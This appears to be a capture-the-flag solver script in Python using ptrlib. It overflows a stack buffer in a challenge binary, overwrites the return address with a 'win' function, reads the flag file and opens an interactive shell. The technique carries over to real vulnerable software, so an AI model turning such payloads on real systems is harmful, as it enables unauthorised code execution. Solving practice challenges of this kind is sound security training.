from ptrlib import *
import time
import os

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "9001"))

elf = ELF("../distfiles/chall")
sock = Socket(HOST, PORT)

payload  = b"A"*0x28
payload += p64(elf.symbol("win"))
sock.sendafter("value: ", payload)

time.sleep(0.5)
sock.sendline("cat flag*.txt")

sock.sh()
